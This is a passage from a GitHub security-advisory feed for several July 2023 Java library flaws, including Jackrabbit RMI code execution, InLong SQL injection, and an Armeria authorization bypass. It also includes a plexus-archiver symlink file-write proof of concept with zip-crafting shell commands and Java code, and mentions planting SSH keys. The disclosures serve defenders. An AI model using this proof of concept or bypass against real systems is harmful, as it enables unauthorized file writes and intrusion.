<li><a href="https://github.com/advisories/GHSA-q8cm-3v62-jj79">https://github.com/advisories/GHSA-q8cm-3v62-jj79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8cm-3v62-jj79</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-07-25T15:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.jackrabbit:jackrabbit-webapp] Remote code execution in Apache Jackrabbit]]></title>
        <id>https://github.com/advisories/GHSA-q8cm-3v62-jj79</id>
        <link href="https://github.com/advisories/GHSA-q8cm-3v62-jj79"/>
        <updated>2023-07-25T19:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>Java object deserialization issue in Jackrabbit webapp/standalone on all platforms allows attacker to remotely execute code via RMIVersions up to (including) 2.20.10 (stable branch) and 2.21.17 (unstable branch) use the component "commons-beanutils", which contains a class that can be used for remote code execution over RMI.</p>
<p>Users are advised to immediately update to versions 2.20.11 or 2.21.18. Note that earlier stable branches (1.0.x .. 2.18.x) have been EOLd already and do not receive updates anymore.</p>
<p>In general, RMI support can expose vulnerabilities by the mere presence of an exploitable class on the classpath. Even if Jackrabbit itself does not contain any code known to be exploitable anymore, adding other components to your server can expose the same type of problem. We therefore recommend to disable RMI access altogether (see further below), and will discuss deprecating RMI support in future Jackrabbit releases.</p>
<p>How to check whether RMI support is enabledRMI support can be over an RMI-specific TCP port, and over an HTTP binding. Both are by default enabled in Jackrabbit webapp/standalone.</p>
<p>The native RMI protocol by default uses port 1099. To check whether it is enabled, tools like "netstat" can be used to check.</p>
<p>RMI-over-HTTP in Jackrabbit by default uses the path "/rmi". So when running standalone on port 8080, check whether an HTTP GET request on localhost:8080/rmi returns 404 (not enabled) or 200 (enabled). Note that the HTTP path may be different when the webapp is deployed in a container as non-root context, in which case the prefix is under the user's control.</p>
<p>Turning off RMIFind web.xml (either in JAR/WAR file or in unpacked web application folder), and remove the declaration and the mapping definition for the RemoteBindingServlet:</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org.apache.jackrabbit.servlet.remote.RemoteBindingServlet
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /rmi
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>Find the bootstrap.properties file (in $REPOSITORY_HOME), and set</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.enabled=false</p>
<p>&nbsp; &nbsp; and also remove</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.host
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.port
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.url-pattern</p>
<p>&nbsp;If there is no file named bootstrap.properties in $REPOSITORY_HOME, it is located somewhere in the classpath. In this case, place a copy in $REPOSITORY_HOME and modify it as explained.</p>
<p>&nbsp;</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37895">https://nvd.nist.gov/vuln/detail/CVE-2023-37895</a></li>
<li><a href="https://lists.apache.org/list.html?users@jackrabbit.apache.org">https://lists.apache.org/list.html?users@jackrabbit.apache.org</a></li>
<li><a href="https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw">https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/8">http://www.openwall.com/lists/oss-security/2023/07/25/8</a></li>
<li><a href="https://github.com/advisories/GHSA-q8cm-3v62-jj79">https://github.com/advisories/GHSA-q8cm-3v62-jj79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8cm-3v62-jj79</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-07-25T15:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.jackrabbit:jackrabbit-webapp] Remote code execution in Apache Jackrabbit]]></title>
        <id>https://github.com/advisories/GHSA-q8cm-3v62-jj79</id>
        <link href="https://github.com/advisories/GHSA-q8cm-3v62-jj79"/>
        <updated>2023-07-25T19:25:32.000Z</updated>
        <content type="html"><![CDATA[<p>Java object deserialization issue in Jackrabbit webapp/standalone on all platforms allows attacker to remotely execute code via RMIVersions up to (including) 2.20.10 (stable branch) and 2.21.17 (unstable branch) use the component "commons-beanutils", which contains a class that can be used for remote code execution over RMI.</p>
<p>Users are advised to immediately update to versions 2.20.11 or 2.21.18. Note that earlier stable branches (1.0.x .. 2.18.x) have been EOLd already and do not receive updates anymore.</p>
<p>In general, RMI support can expose vulnerabilities by the mere presence of an exploitable class on the classpath. Even if Jackrabbit itself does not contain any code known to be exploitable anymore, adding other components to your server can expose the same type of problem. We therefore recommend to disable RMI access altogether (see further below), and will discuss deprecating RMI support in future Jackrabbit releases.</p>
<p>How to check whether RMI support is enabledRMI support can be over an RMI-specific TCP port, and over an HTTP binding. Both are by default enabled in Jackrabbit webapp/standalone.</p>
<p>The native RMI protocol by default uses port 1099. To check whether it is enabled, tools like "netstat" can be used to check.</p>
<p>RMI-over-HTTP in Jackrabbit by default uses the path "/rmi". So when running standalone on port 8080, check whether an HTTP GET request on localhost:8080/rmi returns 404 (not enabled) or 200 (enabled). Note that the HTTP path may be different when the webapp is deployed in a container as non-root context, in which case the prefix is under the user's control.</p>
<p>Turning off RMIFind web.xml (either in JAR/WAR file or in unpacked web application folder), and remove the declaration and the mapping definition for the RemoteBindingServlet:</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org.apache.jackrabbit.servlet.remote.RemoteBindingServlet
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>&nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RMI
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /rmi
&nbsp; &nbsp; &nbsp; &nbsp; </p>
<p>Find the bootstrap.properties file (in $REPOSITORY_HOME), and set</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.enabled=false</p>
<p>&nbsp; &nbsp; and also remove</p>
<p>&nbsp; &nbsp; &nbsp; &nbsp;  rmi.host
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.port
&nbsp; &nbsp; &nbsp; &nbsp;  rmi.url-pattern</p>
<p>&nbsp;If there is no file named bootstrap.properties in $REPOSITORY_HOME, it is located somewhere in the classpath. In this case, place a copy in $REPOSITORY_HOME and modify it as explained.</p>
<p>&nbsp;</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37895">https://nvd.nist.gov/vuln/detail/CVE-2023-37895</a></li>
<li><a href="https://lists.apache.org/list.html?users@jackrabbit.apache.org">https://lists.apache.org/list.html?users@jackrabbit.apache.org</a></li>
<li><a href="https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw">https://lists.apache.org/thread/j03b3qdhborc2jrhdc4d765d3jkh8bfw</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/8">http://www.openwall.com/lists/oss-security/2023/07/25/8</a></li>
<li><a href="https://github.com/advisories/GHSA-q8cm-3v62-jj79">https://github.com/advisories/GHSA-q8cm-3v62-jj79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8cm-3v62-jj79</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-07-25T15:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.inlong:manager-service] SQL injection in audit endpoint]]></title>
        <id>https://github.com/advisories/GHSA-r5pv-7g89-cxmc</id>
        <link href="https://github.com/advisories/GHSA-r5pv-7g89-cxmc"/>
        <updated>2023-07-25T19:24:14.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Special Elements Used in an SQL Command ('SQL Injection') vulnerability in Apache Software Foundation Apache InLong.This issue affects Apache InLong: from 1.4.0 through 1.7.0.&nbsp;
In the toAuditCkSql method, the groupId, streamId, auditId, and dt are directly concatenated into the SQL query statement, which may lead to SQL injection attacks.
Users are advised to upgrade to Apache InLong's 1.8.0 or cherry-pick [1] to solve it.</p>
<p>[1]  <a href="https://github.com/apache/inlong/pull/8198">https://github.com/apache/inlong/pull/8198</a> </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35088">https://nvd.nist.gov/vuln/detail/CVE-2023-35088</a></li>
<li><a href="https://lists.apache.org/thread/os7b66x4n8dbtrdpb7c6x37bb1vjb0tk">https://lists.apache.org/thread/os7b66x4n8dbtrdpb7c6x37bb1vjb0tk</a></li>
<li><a href="https://github.com/apache/inlong/pull/8198">https://github.com/apache/inlong/pull/8198</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/4">http://www.openwall.com/lists/oss-security/2023/07/25/4</a></li>
<li><a href="https://github.com/advisories/GHSA-r5pv-7g89-cxmc">https://github.com/advisories/GHSA-r5pv-7g89-cxmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5pv-7g89-cxmc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-25T09:30:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.inlong:manager-pojo] JDBC URL bypassing by allowLoadLocalInfileInPath param]]></title>
        <id>https://github.com/advisories/GHSA-pq67-9jf9-hc3c</id>
        <link href="https://github.com/advisories/GHSA-pq67-9jf9-hc3c"/>
        <updated>2023-07-25T19:23:01.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of Untrusted Data Vulnerability in Apache Software Foundation Apache InLong.This issue affects Apache InLong: from 1.4.0 through 1.7.0.&nbsp;</p>
<p>The attacker could bypass the current logic and achieve arbitrary file reading. To solve it, users are advised to upgrade to Apache InLong's 1.8.0 or cherry-pick  <a href="https://github.com/apache/inlong/pull/8130">https://github.com/apache/inlong/pull/8130</a> .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34434">https://nvd.nist.gov/vuln/detail/CVE-2023-34434</a></li>
<li><a href="https://lists.apache.org/thread/7f1o71w5r732cspltmtdydn01gllf4jo">https://lists.apache.org/thread/7f1o71w5r732cspltmtdydn01gllf4jo</a></li>
<li><a href="https://github.com/apache/inlong/pull/8130">https://github.com/apache/inlong/pull/8130</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/3">http://www.openwall.com/lists/oss-security/2023/07/25/3</a></li>
<li><a href="https://github.com/advisories/GHSA-pq67-9jf9-hc3c">https://github.com/advisories/GHSA-pq67-9jf9-hc3c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq67-9jf9-hc3c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-25T09:30:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.inlong:inlong-manager] Apache InLong: General user can delete and update process]]></title>
        <id>https://github.com/advisories/GHSA-86pw-4rqp-6x7v</id>
        <link href="https://github.com/advisories/GHSA-86pw-4rqp-6x7v"/>
        <updated>2023-07-25T19:13:03.000Z</updated>
        <content type="html"><![CDATA[<p>Exposure of Resource to Wrong Sphere Vulnerability in Apache Software Foundation Apache InLong.This issue affects Apache InLong: from 1.4.0 through 1.7.0. The attacker could use general users to delete and update the process, which only the admin can operate occurrences.&nbsp;</p>
<p>Users are advised to upgrade to Apache InLong's 1.8.0 or cherry-pick  <a href="https://github.com/apache/inlong/pull/8109">https://github.com/apache/inlong/pull/8109</a> &nbsp;to solve it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34189">https://nvd.nist.gov/vuln/detail/CVE-2023-34189</a></li>
<li><a href="https://lists.apache.org/thread/smxqyx43hxjvzv4w71n2n3rfho9p378s">https://lists.apache.org/thread/smxqyx43hxjvzv4w71n2n3rfho9p378s</a></li>
<li><a href="https://github.com/apache/inlong/issues/8108">https://github.com/apache/inlong/issues/8108</a></li>
<li><a href="https://github.com/apache/inlong/pull/8109">https://github.com/apache/inlong/pull/8109</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/07/25/2">http://www.openwall.com/lists/oss-security/2023/07/25/2</a></li>
<li><a href="https://github.com/advisories/GHSA-86pw-4rqp-6x7v">https://github.com/advisories/GHSA-86pw-4rqp-6x7v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-86pw-4rqp-6x7v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-25T09:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.linecorp.armeria:armeria] Paths contain matrix variables bypass decorators]]></title>
        <id>https://github.com/advisories/GHSA-wvp2-9ppw-337j</id>
        <link href="https://github.com/advisories/GHSA-wvp2-9ppw-337j"/>
        <updated>2023-07-25T23:25:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Spring supports <a href="https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/matrix-variables.html">Matrix variables</a>.
When Spring integration is used, Armeria calls Spring controllers via <code>TomcatService</code> or <code>JettyService</code> with the path
that may contain matrix variables.
In this situation, the Armeria decorators might not invoked because of the matrix variables.
Let's see the following example:</p>
<pre><code>// Spring controller
@GetMapping("/important/resources")
public String important() {...}

// Armeria decorator
ServerBuilder sb = ...
sb.decoratorUnder("/important/", authService);
</code></pre>
<p>If an attacker sends a request with <code>/important;a=b/resources</code>, the request would bypass the authrorizer</p>
<h3 id="patches">Patches</h3>
<ul>
<li><a href="https://github.com/line/armeria-ghsa-wvp2-9ppw-337j/commit/9b0ec3e099cc05fbff11d7f1012a1dddb0000d0c">https://github.com/line/armeria-ghsa-wvp2-9ppw-337j/commit/9b0ec3e099cc05fbff11d7f1012a1dddb0000d0c</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users can add decorators using regex. <code>e.g. "regex:^/important.*"</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/line/armeria/security/advisories/GHSA-wvp2-9ppw-337j">https://github.com/line/armeria/security/advisories/GHSA-wvp2-9ppw-337j</a></li>
<li><a href="https://github.com/line/armeria/commit/49e04ef231ad65750739529c7fa4ce946ff7588b">https://github.com/line/armeria/commit/49e04ef231ad65750739529c7fa4ce946ff7588b</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38493">https://nvd.nist.gov/vuln/detail/CVE-2023-38493</a></li>
<li><a href="https://github.com/line/armeria/commit/039db50bbfc88014ea8737fd1e1ddd6fd3fc4f07">https://github.com/line/armeria/commit/039db50bbfc88014ea8737fd1e1ddd6fd3fc4f07</a></li>
<li><a href="https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/matrix-variables.html">https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/matrix-variables.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wvp2-9ppw-337j">https://github.com/advisories/GHSA-wvp2-9ppw-337j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvp2-9ppw-337j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-25T18:24:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.codehaus.plexus:plexus-archiver] Arbitrary File Creation in AbstractUnArchiver]]></title>
        <id>https://github.com/advisories/GHSA-wh3p-fphp-9h2m</id>
        <link href="https://github.com/advisories/GHSA-wh3p-fphp-9h2m"/>
        <updated>2023-07-25T23:26:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Using AbstractUnArchiver for extracting an archive might lead to an arbitrary file creation and possibly remote code execution.</p>
<h3 id="description">Description</h3>
<p>When extracting an archive with an entry that already exists in the destination directory as a symbolic link whose target does not exist - the resolveFile() function will return the symlink's source instead of its target, which will pass the verification that ensures the file will not be extracted outside of the destination directory. Later Files.newOutputStream(), that follows symlinks by default,  will actually write the entry's content to the symlink's target.</p>
<h3 id="impact">Impact</h3>
<p>Whoever uses plexus archiver to extract an untrusted archive is vulnerable to an arbitrary file creation and possibly remote code execution.</p>
<h3 id="technical-details">Technical Details</h3>
<p>In <a href="https://github.com/codehaus-plexus/plexus-archiver/blob/plexus-archiver-4.7.1/src/main/java/org/codehaus/plexus/archiver/AbstractUnArchiver.java#L342">AbstractUnArchiver.java</a>:</p>
<pre><code class="language-java">protected void extractFile( final File srcF, final File dir, final InputStream compressedInputStream, String entryName, final Date entryDate, final boolean isDirectory, final Integer mode, String symlinkDestination, final FileMapper[] fileMappers)
    throws IOException, ArchiverException
    {
        ...
        // Hmm. Symlinks re-evaluate back to the original file here. Unsure if this is a good thing...
        final File targetFileName = FileUtils.resolveFile( dir, entryName );


        // Make sure that the resolved path of the extracted file doesn't escape the destination directory
        // getCanonicalFile().toPath() is used instead of getCanonicalPath() (returns String),
        // because "/opt/directory".startsWith("/opt/dir") would return false negative.
        Path canonicalDirPath = dir.getCanonicalFile().toPath();
        Path canonicalDestPath = targetFileName.getCanonicalFile().toPath();


        if ( !canonicalDestPath.startsWith( canonicalDirPath ) )
        {
            throw new ArchiverException( "Entry is outside of the target directory (" + entryName + ")" );
        }


        try
        {
            ...
            if ( !StringUtils.isEmpty( symlinkDestination ) )
            {
                SymlinkUtils.createSymbolicLink( targetFileName, new File( symlinkDestination ) );
            }
            else if ( isDirectory )
            {
                targetFileName.mkdirs();
            }
            else
            {
                try ( OutputStream out = Files.newOutputStream( targetFileName.toPath() ) )
                {
                    IOUtil.copy( compressedInputStream, out );
                }
            }


            targetFileName.setLastModified( entryDate.getTime() );


            if ( !isIgnorePermissions() &amp;&amp; mode != null &amp;&amp; !isDirectory )
            {
                ArchiveEntryUtils.chmod( targetFileName, mode );
            }
        }
        catch ( final FileNotFoundException ex )
        {
            getLogger().warn( "Unable to expand to file " + targetFileName.getPath() );
        }
    }
</code></pre>
<p>When given an entry that already exists in dir as a symbolic link whose target does not exist - the symbolic link’s target will be created and the content of the archive’s entry will be written to it.</p>
<p>That’s because the way FileUtils.resolveFile() works:</p>
<pre><code class="language-java">public static File resolveFile( final File baseFile, String filename )
    {
        ...
        try
        {
            file = file.getCanonicalFile();
        }
        catch ( final IOException ioe )
        {
            // nop
        }


        return file;
    }
</code></pre>
<p>File.getCanonicalFile() (tested with the most recent version of openjdk (22.2) on Unix) will eventually call <a href="https://github.com/openjdk/jdk/blob/jdk-22%2B2/src/java.base/unix/native/libjava/canonicalize_md.c#LL48C1-L68C69">JDK_Canonicalize()</a>:</p>
<pre><code class="language-cpp">JNIEXPORT int
JDK_Canonicalize(const char *orig, char *out, int len)
{
    if (len &lt; PATH_MAX) {
        errno = EINVAL;
        return -1;
    }

    if (strlen(orig) &gt; PATH_MAX) {
        errno = ENAMETOOLONG;
        return -1;
    }

    /* First try realpath() on the entire path */
    if (realpath(orig, out)) {
        /* That worked, so return it */
        collapse(out);
        return 0;
    } else {
        /* Something's bogus in the original path, so remove names from the end
           until either some subpath works or we run out of names */
        ...
</code></pre>
<p>realpath() returns the destination path for a symlink, if this destination exists. But if it doesn’t - 
it will return NULL and we will reach the else’s clause, which will eventually return the path of the symlink itself.
So in case the entry is already exists as a symbolic link to a non-existing file - file.getCanonicalFile() will return the absolute path of the symbolic link and this check will pass:</p>
<pre><code class="language-java">Path canonicalDirPath = dir.getCanonicalFile().toPath();
Path canonicalDestPath = targetFileName.getCanonicalFile().toPath();


if ( !canonicalDestPath.startsWith( canonicalDirPath ) )
{
    throw new ArchiverException( "Entry is outside of the target directory (" + entryName + ")" );
}
</code></pre>
<p>Later, the content of the entry will be written to the symbolic link’s destination and by doing so will create the destination file and fill it with the entry’s content.</p>
<p>Arbitrary file creation can lead to remote code execution. For example, if there is an SSH server on the victim’s machine and ~/.ssh/authorized_keys does not exist - creating this file and filling it with an attacker's public key will allow the attacker to connect the SSH server without knowing the victim’s password.</p>
<h3 id="poc">PoC</h3>
<p>We created a zip as following:</p>
<pre><code class="language-bash">$ ln -s /tmp/target entry1
$ echo -ne “content” &gt; entry2
$ zip  --symlinks archive.zip entry1 entry2
</code></pre>
<p>The following command will change the name of entry2 to entry1:</p>
<pre><code class="language-bash">$ sed -i 's/entry2/entry1/' archive.zip
</code></pre>
<p>We put archive.zip in /tmp and create a dir for the extracted files:</p>
<pre><code class="language-bash">$ cp archive.zip /tmp
$ mkdir /tmp/extracted_files
</code></pre>
<p>Next, we wrote a java code that opens archive.zip:</p>
<pre><code class="language-java">package com.example;

import java.io.File;

import org.codehaus.plexus.archiver.zip.ZipUnArchiver;

public class App 
{
    public static void main( String[] args )
    {
        ZipUnArchiver unArchiver = new ZipUnArchiver(new File("/tmp/archive.zip"));
        unArchiver.setDestDirectory(new File("/tmp/extracted_files"));
        unArchiver.extract();        
    }
}
</code></pre>
<p>After running this java code, we can see that /tmp/target contains the string “content”:</p>
<pre><code>$ cat /tmp/target
content
</code></pre>
<p>Notice that although we used here a duplicated entry name in the same archive, this attack can be performed also by two different archives - one that contains a symlink and another archive that contains a regular file with the same entry name as the symlink.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/codehaus-plexus/plexus-archiver/security/advisories/GHSA-wh3p-fphp-9h2m">https://github.com/codehaus-plexus/plexus-archiver/security/advisories/GHSA-wh3p-fphp-9h2m</a></li>
<li><a href="https://github.com/codehaus-plexus/plexus-archiver/commit/54759839fbdf85caf8442076f001d5fd64e0dcb2">https://github.com/codehaus-plexus/plexus-archiver/commit/54759839fbdf85caf8442076f001d5fd64e0dcb2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37460">https://nvd.nist.gov/vuln/detail/CVE-2023-37460</a></li>
<li><a href="https://github.com/codehaus-plexus/plexus-archiver/releases/tag/plexus-archiver-4.8.0">https://github.com/codehaus-plexus/plexus-archiver/releases/tag/plexus-archiver-4.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-wh3p-fphp-9h2m">https://github.com/advisories/GHSA-wh3p-fphp-9h2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wh3p-fphp-9h2m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-25T17:20:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.folio:mod-remote-storage] Hard-coded System User Credentials in Folio Data Export Spring module ]]></title>
        <id>https://github.com/advisories/GHSA-m8v7-469p-5x89</id>
        <link href="https://github.com/advisories/GHSA-m8v7-469p-5x89"/>
        <updated>2023-07-25T14:44:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The module creates a system user that is used to perform internal module-to-module operations.  Credentials for this user are hard-coded in the source code.  This makes it trivial to authenticate as this user, allowing unauthorized read access to these mod-inventory-storage records: instances, holdings, items, contributor-types, identifier-types. This includes records marked as suppressed from discovery.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade mod-remote-storage to &gt;=2.0.3, or a 1.7.x version &gt;=1.7.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds.</p>
<h3 id="references">References</h3>
<p><a href="https://wiki.folio.org/x/hbMMBw">https://wiki.folio.org/x/hbMMBw</a> - FOLIO Security Advisory with Upgrade Instructions
<a href="https://github.com/folio-org/mod-remote-storage/commit/57df495f76e9aa5be9ce7ce3a65f89b6dbcbc13b">https://github.com/folio-org/mod-remote-storage/commit/57df495f76e9aa5be9ce7ce3a65f89b6dbcbc13b</a> - Fix</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/folio-org/mod-remote-storage/security/advisories/GHSA-m8v7-469p-5x89">https://github.com/folio-org/mod-remote-storage/security/advisories/GHSA-m8v7-469p-5x89</a></li>
<li><a href="https://github.com/folio-org/mod-remote-storage/commit/57df495f76e9aa5be9ce7ce3a65f89b6dbcbc13b">https://github.com/folio-org/mod-remote-storage/commit/57df495f76e9aa5be9ce7ce3a65f89b6dbcbc13b</a></li>
<li><a href="https://wiki.folio.org/x/hbMMBw">https://wiki.folio.org/x/hbMMBw</a></li>
<li><a href="https://github.com/advisories/GHSA-m8v7-469p-5x89">https://github.com/advisories/GHSA-m8v7-469p-5x89</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m8v7-469p-5x89</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-25T14:44:27.000Z</published>
    </entry>
</feed>